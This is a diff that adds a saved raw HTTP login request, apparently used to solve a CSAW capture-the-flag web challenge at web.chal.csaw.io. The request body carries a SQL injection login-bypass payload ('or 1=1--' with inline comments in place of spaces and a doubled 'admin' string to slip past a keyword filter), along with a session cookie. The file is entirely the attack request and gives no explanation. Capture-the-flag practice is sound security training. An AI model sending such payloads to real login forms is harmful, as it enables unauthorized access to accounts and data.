@@ -1,0 +1,16 @@
+POST /login HTTP/1.1
+Host: web.chal.csaw.io:5001
+Content-Length: 46
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://web.chal.csaw.io:5001
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://web.chal.csaw.io:5001/login
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: connect.sid=s%3AbpNDG7t_kmri2OoikK4QYrTDLht9Z_V9.mNNKkYrUk%2FwUNvkad%2F4lXE59UyE6LOY6P4PQiUI5rvE
+Connection: close
+
+username=adadminmin'/**/or/**/1=1--&password=b
